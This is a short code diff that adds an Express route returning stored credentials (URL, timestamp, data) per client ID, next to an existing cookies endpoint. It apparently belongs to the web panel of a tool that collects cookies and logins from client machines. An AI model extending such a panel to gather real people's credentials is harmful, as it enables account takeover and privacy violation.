@@ -70,6 +70,16 @@ module.exports = function initializeWebUiApi(appWebUI) {
 
     res.json(cookies);
   });
+  appWebUI.get("/credentials/:client_id", (req, res) => {
+    const { client_id } = req.params;
+    const stmt = db.prepare(
+      `
+      SELECT url,timestamp,data FROM credentials WHERE client_id = ?
+      `
+    );
+    const credentials = stmt.all(client_id);
+    res.json(credentials);
+  });
   appWebUI.get("/*", (req, res) => {
     res.sendFile(path.join(__dirname, "../webui/dist", "index.html"));
   });
